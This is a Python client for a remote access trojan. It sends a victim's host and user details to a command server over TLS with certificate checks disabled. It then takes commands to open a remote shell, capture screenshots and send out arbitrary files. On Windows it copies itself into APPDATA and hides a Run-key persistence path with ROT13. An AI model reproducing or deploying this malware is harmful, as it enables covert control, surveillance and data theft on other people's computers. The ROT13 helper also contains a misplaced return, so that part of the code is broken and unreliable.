import socket, ssl, threading, sys, os, subprocess
import secrets, mss, mss.tools, platform, uuid
import shutil, winreg, hashlib

class Client:
    def __init__(self, server_address, server_port):
        self.server_address = server_address
        self.server_port = server_port
        self.secure_sock = None
        self.platform = platform.system()
        self.hostname = platform.uname()[1]
        self.user = os.getlogin()
        self.mac = uuid.getnode()
        self.uid = self.getClientUID()
        self.commands = {
            'shell': self.reverse_shell,
            'screenshot': self.screenshot,
            'download': self.download
        }
        self.exe_path = None
    
    def connect(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.secure_sock = context.wrap_socket(sock, server_hostname=self.server_address)
        
        try:
            print(f"Connecting to {self.server_address}:{self.server_port}...")
            self.secure_sock.connect((self.server_address, self.server_port))

            information_json = self.getJSONHostInfos()
            self.secure_sock.sendall(information_json.encode())

            self.receive_commands()

        except ssl.SSLError as e:
            print(f"SSL error: {e}")
        except Exception as e:
            print(f"Error: {e}")
        finally:
            self.secure_sock.close()

    def receive_commands(self):
        receive_thread = threading.Thread(target=self._receive_commands)
        receive_thread.start()
        receive_thread.join()

    def _receive_commands(self):
        while True:
            try:
                command = self.secure_sock.recv(4096).decode()

                if command:
                    command_name, *args = command.split(' ')
                    command_name = command_name.lower()
                    if command_name in self.commands:
                        self.commands[command_name](' '.join(args))

                elif not command:
                    print("Connection closed by the server.")
                    break
            except Exception as e:
                break

    def screenshot(self, args):
        if self.platform == 'Windows':
            appdata = os.getenv('APPDATA')
            screen_path = os.path.join(appdata, f"{secrets.token_hex(5)}.jpg")
        elif (self.platform == 'Linux') or (self.platform == 'Darwin'):
            screen_path = f"/tmp/{secrets.token_hex(5)}.jpg"

        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
        
        with open(screen_path, 'rb') as f:
            while (chunk := f.read(1024)):
                self.secure_sock.sendall(chunk)
        self.secure_sock.sendall("EOF".encode())
        os.remove(screen_path)

    def reverse_shell(self, args):
        while True:
            command = self.secure_sock.recv(4096).decode()
            if command.strip().lower() == 'exit':
                break
            try:
                if command.lower().startswith('cd '):
                    directory = command[3:].strip()
                    os.chdir(directory)
                    output = f"Changed directory to {os.getcwd()}"
                else:
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                output = e.output
                self.secure_sock.send(output.encode())
                continue
            except Exception as e:
                output = str(e)
                self.secure_sock.send(output.encode())
                continue
            self.secure_sock.send(output.encode())

    def download(self, args):
        args = args.split(" ")
        for file_path in args:
            try:
                with open(file_path, 'rb') as f:
                    while (chunk := f.read(1024)):
                        self.secure_sock.sendall(chunk)
                self.secure_sock.sendall("EOF".encode())
            except Exception as e:
                self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
    
    def getJSONHostInfos(self):        
        return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\"}}"

    def windowsPersistence(self):

        self.exe_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")

        # If Persistence is already in place
        if os.path.exists(self.exe_path):
            return

        try:
            shutil.copy2(sys.argv[0], self.exe_path)

        except Exception as e:
            return

        # Add the exe to startup programs
        # key name in ROT13 (Software\Microsoft\Windows\CurrentVersion\Run)
        key_name = r"Fbsgjner\Zvpebfbsg\Jvaqbjf\PheeragIrefvba\Eha"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            rot13_decrypt(key_name),
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.exe_path)
        winreg.CloseKey(key)

    def getClientUID(self):
        string = f"{self.hostname}{self.mac}{self.user}"
        hostUID = hashlib.sha256(string.encode()).hexdigest()
        return hostUID[:8]

def rot13_decrypt( text):
    def shift_char(c):
        if 'a' <= c <= 'z':
            return chr((ord(c) - ord('a') + 13) % 26 + ord('a'))
        elif 'A' <= c <= 'Z':
            return chr((ord(c) - ord('A') + 13) % 26 + ord('A'))
        else:
            return c
            
        return ''.join(shift_char(c) for c in text)

if __name__ == "__main__":
    client = Client('127.0.0.1', 8888)
    if client.platform == 'Windows':
        client.windowsPersistence()
    client.connect()